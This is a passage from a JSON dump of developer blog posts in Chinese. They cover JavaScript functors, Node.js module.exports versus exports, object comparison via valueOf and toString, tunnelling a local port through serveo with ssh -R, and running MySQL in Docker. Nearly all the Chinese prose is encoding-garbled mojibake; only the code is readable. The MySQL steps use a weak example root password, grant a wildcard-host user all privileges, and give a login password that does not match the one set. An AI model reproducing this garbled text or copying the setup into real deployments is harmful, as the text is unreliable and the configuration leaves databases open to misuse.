(OOP)`ã€‚\nç„¶è€Œä¸åŒçš„ç¨‹å¼èªè¨€å¯èƒ½ä¹Ÿæœƒæå€¡ä¸åŒçš„è¨­è¨ˆæ–¹æ³•ï¼Œèˆ‰ä¸€å€‹æ˜ç¢ºçš„ä¾‹å­ï¼Œåœ¨ Java çš„ Hello, world ç¨‹å¼ï¼š\n\n```java\npublic class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello! World!\");\n    }\n}\n```\n\næ•´å€‹ç¨‹å¼å¿…é ˆåŒ…è¦†åœ¨ä¸€å€‹èˆ‡æª”æ¡ˆåç¨±åŒåçš„ç‰©ä»¶ä¸­ã€‚\n\nJava é€™å€‹èªè¨€å¯ä»¥èªªå…ˆå¤©å°±æ˜¯ä¸€é–€ç‰©ä»¶å°å‘å¼çš„èªè¨€(é€™å€‹èªªæ³•å¯èƒ½æœ‰äº›çˆ­è­°)ã€‚ä½†é€™å…©ç¨®è¨­è¨ˆæ–¹å¼éƒ½åªæ˜¯æ–¹æ³•ï¼Œä¸¦æ²’æœ‰èªªå“ªä¸€ç¨®èªè¨€å°±åªèƒ½æ­¸é¡æ–¼å“ªä¸€ç¨®è¨­è¨ˆæ–¹å¼ä¸­ã€‚\n\næ‰€ä»¥ï¼ŒC èªè¨€ç•¶ç„¶ä¹Ÿå¯ä»¥å¯¦ç¾ç‰©ä»¶å°å‘ ([ä½ æ‰€ä¸çŸ¥é“çš„ C èªè¨€ï¼šç‰©ä»¶å°å‘ç¨‹å¼è¨­è¨ˆç¯‡](https://hackmd.io/@sysprog/HJLyQaQMl?type=view))ã€‚\n\nç„¶è€Œçœ‹éä¸å°‘äººæœ‰ä¸€ç¨®è¿·æ€ï¼Œèªç‚º**ç‰©ä»¶å°å‘æ‰æ˜¯æ¯”è¼ƒé€²æ­¥çš„è¨­è¨ˆæ–¹å¼**ï¼Œç„¡è«–æ˜¯ç¶­è­·æ€§ï¼Œæˆ–æ˜¯æ•´å€‹ç¨‹å¼ä¹‹é–“çš„æ¶æ§‹éƒ½å„ªæ–¼ `FP`ã€‚\n\nä¸å¯å¦èªçš„æ˜¯ç‰©ä»¶å°å‘çš„ç¢ºæœ‰è¨±å¤šæ¦‚å¿µå°‡æŠ½è±¡åŒ–ç™¼æ®çš„æ›´åŠ å®Œå…¨ï¼Œæå‡è»Ÿé«”å·¥ç¨‹çš„æ•ˆç‡ã€‚ä½†ä»Šå¤©æˆ‘æƒ³è«‡çš„æ˜¯ï¼Œé‚£äº› `functional programming` æˆ‘å€‘å¿½ç•¥æ‰çš„ç‰¹æ€§ï¼Œé€™äº›ç‰¹æ€§ä¹Ÿèƒ½å¹«åŠ©æˆ‘å€‘å°‡ç¨‹å¼ç¢¼é€²ä¸€æ­¥æŠ½è±¡åŒ–ã€‚\n\n## Functional programming\n\nåœ¨ç‰©ä»¶å°å‘è¨­è¨ˆä¸­æˆ‘å€‘çŸ¥é“æœ‰ `Class`, `Object`, `Inheritance` ç­‰ç­‰æ¦‚å¿µã€‚\n\nè€Œåœ¨ `FP` çš„æ¦‚å¿µå‰‡æ˜¯æœ‰ `Immutable object`, `Lambda calculus`, `First class` ç­‰ç­‰ã€‚\n\n### Immutable object\n\nä»£è¡¨å‰µé€ äº†è©²ç‰©ä»¶ä¹‹å¾Œï¼Œå…§å®¹å°±ç„¡æ³•å†è¢«ä¿®æ”¹ã€‚é€™æ¨£çš„ç‰¹æ€§å…ˆå¤©å°±å…·å‚™äº†åœ¨å¤šå€‹åŸ·è¡Œç·’ä¸‹çš„å®‰å…¨æ€§ã€‚æƒ³æƒ³çœ‹ï¼ŒæŸå€‹ç‰©ä»¶å¦‚æœè¢«å¤šå€‹ threads å…±ç”¨ï¼Œä¸æœƒå› ç‚º thread A æ”¹äº†æŸç‰©ä»¶çš„å…§å®¹ï¼Œé€²è€Œå½±éŸ¿äº† thread Bã€‚é€™ä¹Ÿä»£è¡¨ä¸ç”¨ä½¿ç”¨åƒ Lock ä¹‹é¡çš„æ©Ÿåˆ¶ä¾†ä¿è­‰å®‰å…¨æ€§ã€‚\n\nèˆ‰ä¾‹ä¾†èªªï¼š\n\n```javascript\nvar numbers = [1, 4, 9];\nvar roots = numbers.map(Math.sqrt); //mapæœƒreturnä¸€å€‹æ–°çš„array\n// roots ç¾åœ¨æ˜¯ [1, 2, 3]\n// numbers é‚„æ˜¯ [1, 4, 9]\n```\n\næˆ‘å€‘å¯ä»¥èªª map() é€™å€‹å‡½å¼ç¢ºä¿äº† Immutableï¼Œç”šè‡³é‚„æœ‰å¥—ä»¶åº«å¯ä»¥è®“å…¨éƒ¨è³‡æ–™å‹æ…‹éƒ½ä¿æŒ Immutable ([immutable-js](https://github.com/immutable-js/immutable-js))ã€‚\n\n### First class\n\nåœ¨ JavaScript ä¸­ï¼Œæˆ‘å€‘çŸ¥é“ function :\n\n1. å¯ä»¥åƒå…¶ä»– `primitive data type` èˆ¬ï¼Œå¯ä»¥ä»»æ„å‚³é(pass)ï¼ŒæŒ‡æ´¾(assign)\n2. function çš„å›å‚³å€¼ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹ function\n\nä»¥ä¸Šç¬¬ä¸€ç¨®ç‰¹æ€§å¯ä»¥ç´°ç¨±ç‚º `first-class citizen`ï¼Œç¬¬äºŒç¨®ç¨±ç‚º `higher-order function`ã€‚\n\nè€Œé€™å€‹ç‰¹æ€§åˆè¡ä¼¸å‡ºåƒ `é–‰åŒ…(Closure)`, `æŸ¯é‡ŒåŒ–(Currying)` ç­‰ç­‰æ›´å¤šçš„ç‰¹æ€§ã€‚\n\n## ç‚ºä»€éº¼è¦æé€™äº›ï¼Ÿ\n\nåœ¨è¬›è§£ `functor` ä¹‹å‰ï¼Œé©åº¦çš„ç†è§£ `functional programming` æ˜¯å¿…è¦çš„ã€‚\n\n`functional programming` èªªç©¿äº†å°±æ˜¯ä»¥æ•¸å­¸çš„è§’åº¦æ€è€ƒï¼Œä½¿ç”¨ `ç¯„ç–‡è«– (Category Theory)` çš„æ€æƒ³ä¾†è§£æ±ºå•é¡Œã€‚\n\n`functor` å¸¸èˆ‡ `Applicative`, `Monad` é€™ä¸‰å…±åŒè¢«æåŠï¼Œé€™ä¸‰è€…éƒ½æ˜¯ `FP` é‡è¦çš„æ¦‚å¿µã€‚\n\n## ä»€éº¼æ˜¯ functor ï¼Ÿ\n\nè¬›äº†é€™éº¼å¤šï¼Œé‚£ä»€éº¼æ˜¯ functor ï¼Ÿ\n\n> So, What are Functors? Functors are the containers that can be used with â€˜mapâ€™ function. ---å¼•è¿°è‡ª [functors-in-javascript](https://hackernoon.com/functors-in-javascript-20a647b8f39f)\n\nç°¡å–®ä¾†èªªï¼Œä¸€å€‹å®¹å™¨è£¡é¢ï¼Œå«æœ‰ `map()` é€™å€‹å±¬æ€§ï¼Œå°±å¯ä»¥ç¨±ç‚º functorã€‚æœ€ç°¡å–®çš„ä¾‹å­å°±æ˜¯ JavaScript ä¸­çš„ Arrayã€‚\n\n`map()` å±¬æ€§åˆæ˜¯ä»€éº¼ï¼Ÿæ ¹æ“š [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map) çš„è§£é‡‹\n\n> The map() method creates a new array with the results of calling a provided function on every element in the calling array.\n\nç›¸ä¿¡å¤§å®¶éƒ½ç”¨é `map()`ã€‚ä»¥ Array.prototype.map() ç‚ºä¾‹ï¼Œåœ¨ `map()` çš„è™•ç†éç¨‹ä¸­ï¼Œæœƒå…ˆæŠŠ Array ä¸­çš„æ¯ä¸€å€‹ element å–®ç¨ä¸Ÿé€² function è™•ç†ï¼Œä¸¦ä¸”å°‡å„åˆ¥çµæœæ”¾è‡³æ–°çš„ Array å¾Œå›å‚³ã€‚\n\nå¼•ç”¨ MDN çš„ç¯„ä¾‹:\n\n```javascript\nvar numbers = [1, 4, 9];\nvar roots = numbers.map(Math.sqrt); //mapæœƒreturnä¸€å€‹æ–°çš„array\n// roots ç¾åœ¨æ˜¯ [1, 2, 3]\n/* numbers é‚„æ˜¯ [1, 4, 9]ï¼Œé€™è­‰æ˜äº† map() ä¸æœƒå»è®Šå‹•åˆ° numbers çš„å€¼ï¼Œ\n   map å…§éƒ¨æ˜¯åšäº† immutable çš„æ©Ÿåˆ¶ï¼ŒArray.prototype åº•ä¸‹çš„é€™äº›é«˜éšå‡½å¼\n   å¤§å¤šéƒ½å…·æœ‰é€™æ¨£å‡½æ•¸å¼ç·¨ç¨‹è£¡éå¸¸æ³¨é‡çš„ç‰¹æ€§ - immutableï¼Œä¸æœƒå»æ”¹è®Šè³‡æ–™\n   ä¾†æºæœ¬èº«åŸæœ‰çš„å€¼ \n*/\n```\n\nåœ¨ [functors-in-javascript](https://hackernoon.com/functors-in-javascript-20a647b8f39f) ä¸­æœ‰ä¸€å¼µéå¸¸å¯æ„›ä¸”ç°¡å–®æ˜ç­çš„åœ–ç‰‡èªªæ˜äº†é€™ä»¶äº‹\n\n![example_img](https://cdn-images-1.medium.com/max/1600/1*GbH6_EAvPrtQGc9fiVZpMA.gif)\n\nåœ–ä¸­çš„åºåˆ—ï¼Œåˆ†åˆ¥å–å‡ºæ¯ä¸€å€‹å…ƒç´ (å°é›)ï¼Œä¸¦ä¸”åŠ ä»¥æ“ä½œï¼Œæœ€å¾Œå°‡çµæœæ”¾ç½®æ–°çš„åºåˆ—å¾Œå›å‚³(æ³¨æ„ï¼åœ–ç‰‡ä¸­ä¸¦æ²’æœ‰å°‡å°é›æ”¾å›åŸæœ¬çš„ç›’å­ä¸­)ã€‚\n\nèªªåˆ°é€™è£¡ï¼Œæ‡‰è©²æœ‰äººç™¼ç¾å®ƒçš„è¡Œç‚ºèˆ‡ `Array.prototype.forEach()` éå¸¸é¡ä¼¼ã€‚æ²’éŒ¯ï¼ä»–å€‘å…©å€‹å·®ç•°å°±åªæ˜¯*æ˜¯å¦ä¿®æ”¹åŸæœ¬çš„å€¼*ã€‚(å°±æ˜¯å‰é¢æéçš„ Immutable ç‰¹æ€§)\n\nfunctor æœ‰ä¸€å€‹é‡è¦çš„ç‰¹æ€§å°±æ˜¯ç¢ºä¿ Immutableï¼Œç„¶è€Œ forEach å‰‡æœƒç›´æ¥ä¿®æ”¹åŸæœ¬çš„å€¼ã€‚\n\n## çµè«–\n\nè¬›äº†é€™éº¼å¤šï¼Œ`functor` å°æˆ‘çš„ç”Ÿæ´»æœ‰ä»€éº¼å½±éŸ¿å—ï¼Ÿ\n\n`functor` ä¸ä½†å¯ä»¥å¢åŠ ç¨‹å¼ç¢¼çš„å¯è®€æ€§ï¼Œæ›´æ˜¯ `FP` çš„è¨­è¨ˆæ€æƒ³å…¶ä¸­çš„ä¸€ç’°ã€‚\n\nFP çš„è¡¨é”èƒ½åŠ›å…¶å¯¦ä¸éœè‰²æ–¼ OOPã€‚å¤§éƒ¨åˆ†æ™‚å€™ï¼Œåªæ˜¯æˆ‘å€‘å° FP çš„äº†è§£ä¸å¤ æ·±å…¥è€Œå·²ã€‚\n\nåƒæ˜¯æ­¤ç¯‡æœªæåŠçš„ `applicative` å°±æ˜¯ `functor` çš„é€²åŒ–ç‰ˆï¼Œå¦‚æœèªª `functor` æ˜¯æŠŠç®±å­(å®¹å™¨)ä¸­çš„æ¯ä¸€å€‹å…ƒç´ å„åˆ¥ä¸Ÿé€² function è™•ç†ï¼Œé‚£éº¼ `applicative` å¯ä»¥æƒ³åƒç‚ºé€£ function éƒ½åœ¨ç®±å­(å®¹å™¨)ä¸­ã€‚æˆ‘å€‘å¿…é ˆå¾å…©çš„ä¸åŒçš„ç®±å­æ‹¿å‡ºæˆ‘å€‘è¦çš„å…§å®¹ä¾†åšé‹ç®—ã€‚\n\nå¸Œæœ›é€™ç¯‡æ–‡ç« ä¸ä½†èƒ½è®“ä½ äº†è§£ä½•è¬‚ `functor`ï¼Œé‚„å¯ä»¥é€²è€ŒçŸ¥é“ `FP` é‚„æœ‰å…¶ä»–ä½ å¹³å¸¸æ²’æœ‰ç™¼ç¾çš„ç‰¹æ€§ã€‚\n","tags":["javascript","fp"]},{"title":"[nodejs] module.exports èˆ‡ exports çš„å·®ç•°","url":"/2019/07/01/","content":"\n## å‰è¨€\n\nnodejs ä¸­æœ‰è¨±å¤šçš„ç‰¹æ€§æˆ–æ˜¯æ–¹ä¾¿çš„åŠŸèƒ½æˆ‘å€‘æœƒä½¿ç”¨ï¼Œä½†å¯¦éš›ä¸Šä¸çŸ¥é“å…§éƒ¨è™•ç†çš„æ©Ÿåˆ¶ã€‚æœ¬ç¯‡è¦æ¢è¨çš„æ˜¯åŒ¯å‡ºæ¨¡çµ„çš„å…©ç¨®æ–¹å¼ `modules.exports` ä»¥åŠ `exports`\n\n## çµè«–(TL;DR)\n\n> The exports variable is available within a module's file-level scope, and is assigned the value of module.exports before the module is evaluated.\n\nåœ¨ä¸æ›´æ”¹ `modules.exports` èˆ‡ `exports` çš„å‰æä¸‹ï¼Œå…©è€…æ˜¯ä¸€æ¨£çš„ã€‚\nä½¿ç”¨ `require()` å¼•å…¥æ¨¡çµ„ï¼Œå¯¦éš›ä¸Šæ˜¯å» `modules.exports` æ‰¾æ¨¡çµ„ï¼Œæ‰€ä»¥ `exports` åªæ˜¯ç”¨ä¾†è¼”åŠ© `modules.exports`ã€‚\n\nç”¨ç¨‹å¼ç¢¼è§’åº¦ä¾†çœ‹å°±æ˜¯:\n\n```javascript\nmodule.exports = exports = function Constructor() {\n    // ... etc.\n};\n```\n\n-   å…©è€…åˆå§‹æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶\n-   å…©è€…æœ‰ä¸€æŒ‡å‘æ–°ç‰©ä»¶ï¼Œå‰‡æ–·é–‹å…©è€…é—œä¿‚\n-   require æ˜¯å» module.exports æ‰¾æ¨¡çµ„\n\n[Nodejs Doc - modules exports](https://nodejs.org/dist/latest-v10.x/docs/api/modules.html#modules_exports)\n\n## å¯¦é©—æ™‚é–“\n\n### å¯¦é©—ä¸€ (å…©è€…åˆå§‹æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶)\n\nm.js:\n\n```javascript\nexports.a = \"str_a\";\nconsole.log(module.exports); //{ a: 'str_a' }\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports === exports); //true\n```\n\næˆ‘å€‘ç”±ä»¥ä¸Šå¯¦é©—å¯ä»¥å¾—çŸ¥ `exports` èˆ‡ `module.exports` æ˜¯æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶\n\n### å¯¦é©—äºŒ (module.exports æŒ‡å‘æ–°ç‰©ä»¶ï¼Œæ–·é–‹é—œä¿‚)\n\nm.js:\n\n```javascript\nexports.a = \"str_a\";\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports); //{ a: 'str_a' }\nmodule.exports = { b: \"str_b\" }; // æ­¤æ™‚å°‡ module.exports é‡æ–°çµ¦å®šä¸€ç‰©ä»¶ï¼Œæ–·é–‹èˆ‡ exports ä¹‹é—œä¿‚\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports); //{ b: 'str_b' }\n```\n\n### å¯¦é©—ä¸‰ (require æ˜¯å» module.exports æ‰¾æ¨¡çµ„)\n\nm.js:\n\n```javascript\nmodule.exports = { a: 123 };\nexports.b = \"456\";\n```\n\nmain.js:\n\n```javascript\nlet x = require(\"./m.js\");\nconsole.log(x); //{ a: 123 }\n```\n","tags":["javascript","nodejs","es6"]},{"title":"JavaScript ä¸­ç‰©ä»¶æ¯”å¤§å°çš„ä¾æ“šåˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ","url":"/2019/06/13/","content":"\n## å‰è¨€\n\nåœ¨ JavaScript ä¸­å¾ˆå¤šæ¯”è¼ƒçš„æƒ…æ³éå¸¸ä¸ç¬¦åˆé‚è¼¯ï¼Œåœ¨ä»Šå¹´ AIS3 (2019) pre-exam ä¸­ï¼Œæœ‰è€ƒåˆ°é¡ä¼¼æ¦‚å¿µæ‰€å¼•ç™¼çš„éŒ¯èª¤æƒ…å½¢ã€‚æ–¼æ˜¯è¨˜éŒ„ä¸€ä¸‹ JavaScript åœ¨æ¯”è¼ƒç‰©ä»¶æ™‚åˆ°åº•æ˜¯ä¾æ“šä»€éº¼è¦å‰‡ã€‚\n\n## å…ˆçœ‹å¹¾ç¨®å¸¸è¦‹çš„æƒ…æ³\n\n```JavaScript\n> 100 > 10\ntrue\n> 100 > \"10\" //(å­—ä¸²èˆ‡æ•¸å­—æ¯”è¼ƒï¼Œæœƒå°‡å­—ä¸²è‡ªå‹•è½‰ç‚ºæ•¸å­—ä¾†æ¯”è¼ƒ)\ntrue\n> \"100\" > \"10\" //(å…©è€…éƒ½æ˜¯å­—ä¸²ï¼Œå¯¦éš›ä¸Šæ˜¯æŒ‰ç…§å­—æ¯é †åºä¾†æ¯”è¼ƒï¼Œä¸‹é¢çš„ä¾‹å­è¼ƒæ˜é¡¯ã€‚ä¸¦ä¸æ˜¯å°‡å…©å€‹å­—ä¸²è½‰æˆæ•¸å­—ä¾†æ¯”)\ntrue\n> \"abc\" > \"aaa\"\ntrue\n> \"ab\" > \"ac\"\nfalse\n```\n\n## ç‰©ä»¶çš„æ¯”è¼ƒè¦å‰‡\n\n### ä¾†é»ç§‘æ™®\n\né€™æ¬¡çš„é‡é»åœ¨æ–¼å…©å€‹ç‰©ä»¶çš„æ¯”è¼ƒæ˜¯ä¾æ“šä½•è€…ä¾†æ¯”è¼ƒï¼Œé¦–å…ˆè¦å…ˆçŸ¥é“ JS æœ‰å¹¾ç¨®å‹æ…‹\n\n-   null\n-   undefined\n-   boolean\n-   number\n-   string\n-   symbol\n-   object\n\næ‰€ä»¥ JS çš„å‹æ…‹éƒ½åœ¨é€™ä¸ƒç¨®ä¹‹å…§ã€‚ç„¶è€Œï¼Œé™¤äº† object ä»¥å¤–ï¼Œéƒ½å±¬æ–¼åŸºæœ¬å‹æ…‹([primitive data type](https://developer.mozilla.org/zh-TW/docs/Glossary/Primitive))ã€‚\n\n### æ¯”è¼ƒçš„ä¾æ“š\n\nç‰©ä»¶çš„æ¯”è¼ƒæµç¨‹ç‚ºä»¥ä¸‹(è‹¥æˆåŠŸå‰‡åœï¼Œå¤±æ•—å‰‡å¾€ä¸‹ä¸€æ­¥)ï¼š\n\n1. å‘¼å«ç‰©ä»¶å…§çš„ valueOf æ–¹æ³•æ±‚å¾— return å€¼(å€¼å¿…é ˆç‚º primitive data type)\n\n(è‹¥é primitive data tpye æˆ–æ˜¯æ²’æœ‰ valueOf æ–¹æ³•å‰‡å¾€ä¸‹)\n\n2. å‘¼å« toString æ–¹æ³•æ±‚å¾— return å€¼(å€¼å¿…é ˆç‚º primitive data type)\n\n(è‹¥é primitive data tpye æˆ–æ˜¯æ²’æœ‰ valueOf æ–¹æ³•å‰‡å¾€ä¸‹)\n\n3. æ‹‹å‡ºéŒ¯èª¤ (TypeError: Cannot convert object to primitive value)\n\n## é€²è¡Œå¯¦é©—\n\n1. å¯¦é©—ä¸€ (object å…§çš„ valueOf)ï¼š\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 123;\n    },\n    toString() {\n        return {};\n    }\n};\nif (obj > 100) console.log(\"great!\");\n//output: great!\n```\n\n2. å¯¦é©—äºŒ (valueOf å›å‚³å€¼ä¸æ˜¯ primitive data type)ï¼š\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return {};\n    },\n    toString() {\n        return 123;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\n//output: great!\n```\n\n3. å¯¦é©—ä¸‰ (valueOf èˆ‡ toString çš„æ¯”è¼ƒé †åº)ï¼š\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 200;\n    },\n    toString() {\n        return 50;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\nelse console.log(\"QQ\");\n//output: great!\n```\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 50;\n    },\n    toString() {\n        return 200;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\nelse console.log(\"QQ\");\n//output: QQ\n```\n\n4. å¯¦é©—å››ï¼ˆå…©è€…å›å‚³å€¼éƒ½éç‚º primitive data typeï¼Œæ‹‹å‡ºéŒ¯èª¤ï¼‰\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return {};\n    },\n    toString() {\n        return {};\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\n//output:\n//if (obj > 100) console.log(\"great!\");\n//        ^\n\n//TypeError: Cannot convert object to primitive value\n//    at Object.<anonymous> (/Users/yiyuchang/dev/tmp/article/example.js:10:9)\n//    ......\n```\n\n## ç‰©ä»¶é è¨­çš„ valueOf, toString\n\n```JavaScript\nlet obj = {};\nconsole.log(obj.valueOf());\nconsole.log(obj.toString());\nif (obj == \"[object Object]\") console.log(\"great!\");\n//output:\n//\n//{}\n//[object Object]\n//great!\n```\n\né è¨­æƒ…æ³ä¸‹ç‰©ä»¶æ˜¯çš„ valueOf æ˜¯å›å‚³ç©ºç‰©ä»¶ {}ï¼Œè€Œ toString å‰‡æ˜¯å›å‚³ [object Object] å­—ä¸²ï¼\n\n## çµè«–\n\nå¸Œæœ›é€™ç¯‡ç‰©ä»¶æ¯”è¼ƒçš„è¦å‰‡èªªæ˜æœ‰å¹«åŠ©åˆ°å¤§å®¶ï¼Œjavascipt çœŸæ˜¯ä¸€é–€ç¥å¥‡çš„èªè¨€(?) ğŸ˜„\n","tags":["javascript"]},{"title":"ç”¨ serveo ä¾†ç©¿é€å…§ç¶²å§","url":"/2019/06/03/","content":"\næœ‰æ™‚å€™æœƒéœ€è¦æš«æ™‚çš„ public ip ä¾†é‹è¡Œç’°å¢ƒï¼Œæ¯”è¼ƒå¸¸è¦‹çš„éœ€æ±‚åƒæ˜¯\n\n- åˆ†äº«ä¸€å€‹æª”æ¡ˆçµ¦å…§ç¶²å¤–çš„æœ‹å‹\n- æ¸¬è©¦ç’°å¢ƒéœ€è¦ SSL æ†‘è­‰ (https)\n- API çš„ callback url (éœ€è¦ https)\n\né›–ç„¶è¦åœ¨æœ¬åœ°ç«¯ä½¿ç”¨æ†‘è­‰ä¸æ˜¯ä¸èƒ½ï¼Œåªæ˜¯è¨­å®šéœ€è¦ä¸€äº›æ™‚é–“ã€‚ä¹‹å‰æˆ‘æœ‰é€™æ¨£çš„éœ€æ±‚æ™‚éƒ½æ˜¯é€é [ngrok](https://ngrok.com/)ã€‚é•·ä¹…ä½¿ç”¨ä¸‹ä¾†é‚„ç®—æ–¹ä¾¿ï¼Œç¾ä¸­ä¸è¶³çš„é»æ˜¯ ngrok åˆ†äº«å‡ºä¾†çš„å¤–ç¶²ç¶²å€ä¸æ˜¯å¾ˆä¹¾æ·¨\n\n<!-- {% asset_img ngrok.png %} -->\n![1](ngrok.png)\n\nä»¥ä¸Šçš„ ngrok çš„æˆªåœ–ï¼Œåˆ†äº«å‡ºä¾†çš„ç¶²å€æ˜¯ `https://50bb33a3.ngrok.io`\n\nç„¶è€Œå°±åœ¨å‰å¹¾å¤©ç™¼ç¾æ›´æ£’çš„æ–¹æ¡ˆï¼Œ[serveo](https://serveo.net/)ã€‚\n\nserveo é€é ssh çš„æ–¹å¼å°‡ä¸€å€‹å…·æœ‰ public ip çš„ domain æ˜ å°„åˆ°å…§ç¶²ï¼Œæœ€æ£’çš„åœ°æ–¹åœ¨æ–¼å› ç‚ºæ˜¯é€é sshï¼Œæ‰€ä»¥ä¸éœ€è¦å®‰è£å¥—ä»¶ï¼Œè€Œä¸”æ˜ å°„å‡ºä¾†çš„ domain é‚„å¯ä»¥è‡ªè¨‚ï¼\n\né€™æ¨£çš„æœå‹™å±…ç„¶ä¸è¦æ”¶è²»ï¼ŒçœŸçš„å¤ªä½›å¿ƒäº†ï¼\n\nä»–çš„å®˜ç¶²ä¸Šç°¡æ½”æ˜ç­çš„ä¸€å¥è©±:\n\n`ssh -R 80:localhost:3000 serveo.net`\n\nç°¡å–®ä¸€è¡ŒæŒ‡ä»¤å°±æœƒè‡ªå‹•ç”¢ç”Ÿä¸€å€‹ domain ä¾†æ˜ å°„åˆ°å…§ç¶²çš„ 3000 port\n\n<!-- {% asset_img serveo.png %} -->\n![2](serveo.png)\n\nä¹Ÿå¯ä»¥ç”¨å‰›æ‰æåˆ°çš„è‡ªè¨‚å­åŸŸåçš„æ–¹å¼\n\n`ssh -R yiyu:80:localhost:8888 serveo.net`\n\n<!-- {% asset_img serveo_yiyu.png %} -->\n![3](serveo_yiyu.png)\n\né€™æ¨£å­å¯ä»¥é€é `https://yiyu.serveo.net` ä¾†è¨ªå•å…§ç¶² 8888 port\n\nå¦‚æ­¤ä¸€ä¾†è¦åˆ†äº«æŸä¸€å€‹ç›®éŒ„ä¸‹çš„æª”æ¡ˆå¯ä»¥å…ˆé€é python3 ä¾†å•Ÿå‹•ä¸€å€‹ç°¡å–®çš„ HFS\n\n`python3 -m http.server`\n\nç„¶å¾Œå†ç©¿é€å…§ç¶²\n\n`ssh -R yiyu:80:localhost:8000 serveo.net`\n\n(python3 çš„ http.server é è¨­é–‹ 8000 port)\n\nå¦‚æ­¤ä¸€ä¾†äººå®¶å°±å¯ä»¥é€é `https://yiyu.serveo.net` ä¾†å–å¾—è·¯å¾‘ä¸‹çš„æª”æ¡ˆäº†ï¼Œéå¸¸æ–¹ä¾¿ ğŸ˜„\n","tags":["tools"]},{"title":"åœ¨ macOS ä¸Šä½¿ç”¨ docker é‹è¡Œ mysql","url":"/2019/05/20/","content":"\n## å‰è¨€\n\næƒ³æ¸¬è©¦ mysql çš„æŒ‡ä»¤åˆä¸å–œæ­¡æ±¡æŸ“è‡ªå·±çš„æ©Ÿå™¨ï¼Œdocker æ˜¯ä½ çš„å¥½é¸æ“‡ã€‚ä½†æ˜¯åœ¨ docker è·‘ mysql æœƒé‡åˆ°ä¸€äº›å°é›·é»ï¼Œåœ¨é€™é‚Šç´€éŒ„ä¸€ä¸‹ã€‚\n\n## æ­£æ–‡\n\nèµ·æ‰‹å¼ï¼ŒæŠŠ mysql çš„ image æ‹‰ä¸‹ä¾†\n`docker pull mysql`\n\nä¹‹å¾Œå°±å¯ä»¥æŠŠ container è·‘èµ·ä¾†\n`docker run -p 3306:3306 -d --name mysql -e MYSQL_ROOT_PASSWORD=password mysql`\n\nMYSQL_ROOT_PASSWORD å¾Œé¢é‚£ä¸²æ–‡å­—æ˜¯ root å¯†ç¢¼ï¼Œåœ¨æ­¤ç”¨ password èˆ‰ä¾‹ï¼Œå¯ä»¥æ›æˆè‡ªå·±å–œæ­¡çš„\n\nç¢ºå®šè·‘èµ·ä¾†ä¹‹å¾Œï¼Œè¦é€²å» container ä¸­æ–°å»ºç”¨æˆ¶ï¼Œä¸¦ä¸”æŠŠæ¬Šé™æ‰“é–‹ (é è¨­åªæœ‰ localhost å¯ä»¥é€£ç·š)\n\né€²å…¥ container:\n`docker exec -it mysql bash`\n\nä½¿ç”¨å‰›æ‰è¨­å®šçš„å¯†ç¢¼é€²å» mysql (æ­¤æŒ‡ä»¤è¦åœ¨ container ä¸­åŸ·è¡Œ):\n`mysql -uroot -ppasswd`\n\nä¹‹å¾Œå°±å‰µå»ºè‡ªå·±æƒ³è¦çš„ç”¨æˆ¶ï¼Œä¸¦ä¸”è¨­å®šå¯†ç¢¼(åœ¨æ­¤ç”¨ password)ã€‚ç„¶å¾Œè¦è¨˜å¾—æŠŠæ¬Šé™æ‰“é–‹ï¼Œé™¤äº† localhost çš„ç”¨æˆ¶æ‰é€£å¾—åˆ°\n\n```mysql\nmysql> CREATE USER 'yiyu'@'%' IDENTIFIED BY 'password';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT ALL PRIVILEGES ON * . * TO 'yiyu'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql> quit\n```\n\nè¨­å®šå®Œç•¢ä¹‹å¾Œå°±é€€å‡º container\n\nå†ä¾†å°±æœƒé‡åˆ°ä¸€å€‹é›·é»!\n\nä½¿ç”¨æˆ‘å‰›æ‰å‰µå»ºçš„ç”¨æˆ¶ç™»å…¥(æ­¤æŒ‡ä»¤åœ¨ macOS ä¸‹åŸ·è¡Œ)\n\n```\nmysql -u yiyu -p\nEnter password:\nERROR 2002 (HY000): Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)\n```\n\nç³»çµ±æœƒå™´ä¸€å€‹éŒ¯èª¤å‡ºä¾†ï¼Œè€Œä¸”çœ‹èµ·ä¾†ä»–æ˜¯å»æ‰¾ local çš„ mysqlï¼Œä½†æˆ‘å€‘çš„ mysql ä¸æ˜¯åœ¨ local è€Œæ˜¯åœ¨ container ä¹‹ä¸­ã€‚\n\nåƒè€ƒäº†é€™ç¯‡æ–‡ç« :\n\n[Unix domain socket å’Œ TCP/IP socket çš„åŒºåˆ«](https://jaminzhang.github.io/network/the-difference-between-unix-domain-socket-and-tcp-ip-socket/)\n\nç°¡å–®ä¾†èªªå°±æ˜¯å¦‚æœå•Ÿå‹• mysql å»é€£ localhost ä¸æœƒçœŸçš„èµ° TCPï¼Œè€Œæ˜¯èµ°é è¨­çš„ UNIX Domain Socketï¼Œé€™æ¨£å­å¯ä»¥è®“é€šè¨Šæ›´å¿«ï¼Œä¸ç”¨æ‹†è§£å°åŒ…ã€‚\n\nä½†æ˜¯æˆ‘å€‘éœ€è¦é€é TCP ä¾†è®“ localhost çš„ 3306 port mapping åˆ° container ä¸­\n\næ‰€ä»¥æŒ‡ä»¤æ‡‰è©²è¦æŒ‡å®šèµ° tcp é€£ç·š\n\n`mysql -h localhost --protocol=tcp -u yiyu -p`\n\n```\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 16\nServer version: 8.0.16 MySQL Community Server - 